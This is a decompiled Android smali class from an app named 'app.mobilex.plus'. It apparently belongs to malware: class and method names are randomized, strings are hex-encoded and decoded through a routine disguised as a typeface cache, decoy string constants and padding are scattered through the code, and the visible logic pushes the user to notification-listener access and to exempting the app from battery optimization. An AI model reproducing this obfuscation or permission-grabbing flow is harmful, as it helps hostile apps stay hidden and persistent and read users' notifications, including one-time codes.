.class public final Lv/s/H7JWbAQ2EAug6YHM8S;
.super Lv/s/LGm23hksIOxB;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Lv/s/JRdueaGIH5g8DVCPba;


# instance fields
.field public final synthetic JXn4Qf7zpnLjP5:Lapp/mobilex/plus/UtilNWWrapper;

.field public final synthetic vekpFI4d1Nc4fakF:I


# direct methods
.method public synthetic constructor <init>(Lapp/mobilex/plus/UtilNWWrapper;I)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/H7JWbAQ2EAug6YHM8S;->vekpFI4d1Nc4fakF:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/H7JWbAQ2EAug6YHM8S;->JXn4Qf7zpnLjP5:Lapp/mobilex/plus/UtilNWWrapper;

    .line 4
    .line 5
    const/4 p1, 0x0

    .line 6
    invoke-direct {p0, p1}, Lv/s/LGm23hksIOxB;-><init>(I)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method private static synthetic ozkgzgdi()V
    .locals 1

    const-string v0, "secondary"

    const-string v0, "Preferences"

    const-string v0, "Settings"

    const-string v0, "io.manager.izsvyuzexw"

    const-string v0, "onCreate"

    const-string v0, "http://"

    const-string v0, "click"

    return-void
.end method


# virtual methods
.method public final w9sT1Swbhx3hs()Ljava/lang/Object;
    .locals 6

    .line 1
    iget v0, p0, Lv/s/H7JWbAQ2EAug6YHM8S;->vekpFI4d1Nc4fakF:I

    .line 2
    .line 3
    const-string v1, "00220078005F009500FF00B600D600E900300073004F009300F900B100D500B4006D0057007800B300D9009000FC0098000D0059006F00AE00D6009600F100860017005F007400A900CF009300FB009400170053007500A200C2008000E1008200170042007200A900D7008C"

    .line 4
    .line 5
    const-string v2, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    .line 6
    .line 7
    const/16 v3, 0x0

    .line 8
    sget-object v4, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 9
    .line 10
    iget-object v5, p0, Lv/s/H7JWbAQ2EAug6YHM8S;->JXn4Qf7zpnLjP5:Lapp/mobilex/plus/UtilNWWrapper;

    .line 11
    .line 12
    packed-switch v0, :pswitch_data_0

    .line 13
    .line 14
    .line 15
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->euF5Udt5Rqv3Qmea:Ljava/lang/String;

    .line 16
    .line 17
    invoke-virtual {v5, v0, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 18
    .line 19
    .line 20
    move-result-object v0

    .line 21
    return-object v0

    .line 22
    :pswitch_0
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 23
    .line 24
    invoke-virtual {v5, v0, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 25
    .line 26
    .line 27
    move-result-object v0

    .line 28
    return-object v0

    .line 29
    :pswitch_1
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 30
    .line 31
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->yTljMGnIibTRdOpSh4()Z

    .line 32
    .line 33
    .line 34
    move-result v0

    .line 35
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 36
    .line 37
    .line 38
    move-result-object v0

    .line 39
    return-object v0

    .line 40
    :pswitch_2
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 41
    .line 42
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->hV4VTKNUdeHN()V

    .line 43
    .line 44
    .line 45
    return-object v4

    .line 46
    :pswitch_3
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 47
    .line 48
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->EWUjsTERgdPbSw3NNlN()Z

    .line 49
    .line 50
    .line 51
    move-result v0

    .line 52
    if-eqz v0, :cond_0

    .line 53
    .line 54
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->O2DHNSIGZlgPja7eqLgn()Z

    .line 55
    .line 56
    .line 57
    move-result v0

    .line 58
    if-eqz v0, :cond_0

    .line 59
    .line 60
    const/4 v3, 0x1

    .line 61
    :cond_0
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 62
    .line 63
    .line 64
    move-result-object v0

    .line 65
    return-object v0

    .line 66
    :pswitch_4
    invoke-static {v5}, Lapp/mobilex/plus/UtilNWWrapper;->pyu8ovAipBTLYAiKab(Lapp/mobilex/plus/UtilNWWrapper;)V

    .line 67
    .line 68
    .line 69
    return-object v4

    .line 70
    :pswitch_5
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    nop

    nop

    .line 71
    .line 72
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->vIJudZvPyTuNp()Z

    .line 73
    .line 74
    .line 75
    move-result v0

    .line 76
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 77
    .line 78
    .line 79
    move-result-object v0

    .line 80
    return-object v0

    nop

    .line 81
    :pswitch_6
    invoke-static {v5}, Lapp/mobilex/plus/UtilNWWrapper;->b1EoSIRjJHO5(Lapp/mobilex/plus/UtilNWWrapper;)V

    .line 82
    .line 83
    .line 84
    return-object v4

    .line 85
    :pswitch_7
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 86
    .line 87
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->dTS0S7eC32ubQH54j36()Z

    .line 88
    .line 89
    .line 90
    move-result v0

    .line 91
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 92
    .line 93
    .line 94
    move-result-object v0

    .line 95
    return-object v0

    .line 96
    :pswitch_8
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 97
    .line 98
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->XuO9PPFo607ssKwZjNW()V

    .line 99
    .line 100
    .line 101
    return-object v4

    .line 102
    :pswitch_9
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 103
    .line 104
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->EWUjsTERgdPbSw3NNlN()Z

    .line 105
    .line 106
    .line 107
    move-result v0

    nop

    nop

    .line 108
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 109
    .line 110
    .line 111
    move-result-object v0

    .line 112
    return-object v0

    .line 113
    :pswitch_a
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 114
    .line 115
    sget-object v0, Lapp/mobilex/plus/HandlerSJAdapter;->dTS0S7eC32ubQH54j36:Ljava/lang/String;

    .line 116
    .line 117
    invoke-static {}, Lv/s/jb8et6SZeK5TWMrJFxDX;->gmNWMfvn6zlEj()Z

    .line 118
    .line 119
    .line 120
    move-result v0

    .line 121
    if-eqz v0, :cond_1

    .line 122
    .line 123
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->gmNWMfvn6zlEj()V

    .line 124
    .line 125
    .line 126
    goto/16 :goto_0

    nop

    nop

    .line 127
    :cond_1
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    .line 128
    .line 129
    const-class v1, Lapp/mobilex/plus/HandlerSJAdapter;

    .line 130
    .line 131
    invoke-direct {v0, v5, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 132
    .line 133
    .line 134
    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 135
    .line 136
    .line 137
    goto/16 :goto_0

    .line 138
    :catch_0
    move-exception v0

    .line 139
    const-string v1, "00310073004A009200F500AC00C6008A002600720052008600C000AD00DD00AD00260075004F008E00FF00B1009200A2003100640054009500AA00FF"

    .line 140
    .line 141
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 142
    .line 143
    .line 144
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 145
    .line 146
    .line 147
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->gmNWMfvn6zlEj()V

    .line 148
    .line 149
    .line 150
    :goto_0
    return-object v4

    .line 151
    :pswitch_b
    invoke-static {v5}, Lapp/mobilex/plus/UtilNWWrapper;->b1EoSIRjJHO5(Lapp/mobilex/plus/UtilNWWrapper;)V

    .line 152
    .line 153
    .line 154
    return-object v4

    .line 155
    :pswitch_c
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 156
    .line 157
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->dTS0S7eC32ubQH54j36()Z

    .line 158
    .line 159
    .line 160
    move-result v0

    .line 161
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 162
    .line 163
    .line 164
    move-result-object v0

    .line 165
    return-object v0

    .line 166
    :pswitch_d
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 167
    .line 168
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->XuO9PPFo607ssKwZjNW()V

    .line 169
    .line 170
    .line 171
    return-object v4

    .line 172
    :pswitch_e
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 173
    .line 174
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->EWUjsTERgdPbSw3NNlN()Z

    .line 175
    .line 176
    .line 177
    move-result v0

    nop

    nop

    .line 178
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 179
    .line 180
    .line 181
    move-result-object v0

    .line 182
    return-object v0

    .line 183
    :pswitch_f
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 184
    .line 185
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->yTljMGnIibTRdOpSh4()Z

    .line 186
    .line 187
    .line 188
    move-result v0

    .line 189
    if-eqz v0, :cond_2

    .line 190
    .line 191
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->gmNWMfvn6zlEj()V

    .line 192
    .line 193
    .line 194
    goto :goto_1

    .line 195
    :cond_2
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    .line 196
    .line 197
    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 198
    .line 199
    .line 200
    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 201
    .line 202
    .line 203
    goto :goto_1

    .line 204
    :catch_1
    :try_start_2
    new-instance v0, Landroid/content/Intent;

    nop

    .line 205
    .line 206
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 207
    .line 208
    .line 209
    move-result-object v1

    .line 210
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 211
    .line 212
    .line 213
    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 214
    .line 215
    .line 216
    :catch_2
    :goto_1
    return-object v4

    .line 217
    :pswitch_10
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 218
    .line 219
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->EWUjsTERgdPbSw3NNlN()Z

    .line 220
    .line 221
    .line 222
    move-result v0

    .line 223
    if-eqz v0, :cond_3

    .line 224
    .line 225
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->D5P1xCAyuvgF()V

    .line 226
    .line 227
    .line 228
    goto/16 :goto_2

    nop

    .line 229
    :cond_3
    :try_start_3
    new-instance v0, Landroid/content/Intent;

    .line 230
    .line 231
    const-string v1, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    .line 232
    .line 233
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 234
    .line 235
    .line 236
    const-string v1, "003300770058008C00F100B800D700FD"

    .line 237
    .line 238
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 239
    .line 240
    .line 241
    move-result-object v1

    nop

    nop

    .line 242
    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 243
    .line 244
    .line 245
    move-result-object v2

    .line 246
    new-instance v3, Ljava/lang/StringBuilder;

    nop

    .line 247
    .line 248
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 249
    .line 250
    .line 251
    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 252
    .line 253
    .line 254
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 255
    .line 256
    .line 257
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 258
    .line 259
    .line 260
    move-result-object v1

    .line 261
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 262
    .line 263
    .line 264
    move-result-object v1

    .line 265
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 266
    .line 267
    .line 268
    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 269
    .line 270
    .line 271
    goto :goto_2

    .line 272
    :catch_3
    :try_start_4
    new-instance v0, Landroid/content/Intent;

    .line 273
    .line 274
    const-string v1, "android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"

    .line 275
    .line 276
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 277
    .line 278
    .line 279
    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 280
    .line 281
    .line 282
    :catch_4
    :goto_2
    return-object v4

    .line 283
    :pswitch_11
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 284
    .line 285
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->EWUjsTERgdPbSw3NNlN()Z

    .line 286
    .line 287
    .line 288
    move-result v0

    .line 289
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 290
    .line 291
    .line 292
    move-result-object v0

    .line 293
    return-object v0

    .line 294
    :pswitch_12
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 295
    .line 296
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->euF5Udt5Rqv3Qmea()V

    .line 297
    .line 298
    .line 299
    return-object v4

    .line 300
    :pswitch_13
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 301
    .line 302
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->O2DHNSIGZlgPja7eqLgn()Z

    .line 303
    .line 304
    .line 305
    move-result v0

    nop

    nop

    .line 306
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 307
    .line 308
    .line 309
    move-result-object v0

    nop

    nop

    .line 310
    return-object v0

    .line 311
    :pswitch_14
    invoke-static {v5}, Lapp/mobilex/plus/UtilNWWrapper;->pyu8ovAipBTLYAiKab(Lapp/mobilex/plus/UtilNWWrapper;)V

    .line 312
    .line 313
    .line 314
    return-object v4

    .line 315
    :pswitch_15
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 316
    .line 317
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->vIJudZvPyTuNp()Z

    .line 318
    .line 319
    .line 320
    move-result v0

    .line 321
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 322
    .line 323
    .line 324
    move-result-object v0

    .line 325
    return-object v0

    .line 326
    :pswitch_16
    invoke-static {v5}, Lapp/mobilex/plus/UtilNWWrapper;->b1EoSIRjJHO5(Lapp/mobilex/plus/UtilNWWrapper;)V

    .line 327
    .line 328
    .line 329
    return-object v4

    .line 330
    :pswitch_17
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 331
    .line 332
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->dTS0S7eC32ubQH54j36()Z

    .line 333
    .line 334
    .line 335
    move-result v0

    .line 336
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 337
    .line 338
    .line 339
    move-result-object v0

    .line 340
    return-object v0

    .line 341
    :pswitch_18
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 342
    .line 343
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->yTljMGnIibTRdOpSh4()Z

    .line 344
    .line 345
    .line 346
    move-result v0

    .line 347
    if-eqz v0, :cond_4

    .line 348
    .line 349
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->D5P1xCAyuvgF()V

    .line 350
    .line 351
    .line 352
    goto :goto_3

    .line 353
    :cond_4
    :try_start_5
    new-instance v0, Landroid/content/Intent;

    .line 354
    .line 355
    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 356
    .line 357
    .line 358
    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    .line 359
    .line 360
    .line 361
    goto :goto_3

    .line 362
    :catch_5
    :try_start_6
    new-instance v0, Landroid/content/Intent;

    .line 363
    .line 364
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 365
    .line 366
    .line 367
    move-result-object v1

    nop

    .line 368
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 369
    .line 370
    .line 371
    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    .line 372
    .line 373
    .line 374
    :catch_6
    :goto_3
    return-object v4

    .line 375
    :pswitch_19
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 376
    .line 377
    invoke-virtual {v5}, Lapp/mobilex/plus/UtilNWWrapper;->yTljMGnIibTRdOpSh4()Z

    .line 378
    .line 379
    .line 380
    move-result v0

    .line 381
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    .line 382
    .line 383
    .line 384
    move-result-object v0

    .line 385
    return-object v0

    .line 386
    .line 387
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_19
        :pswitch_18
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
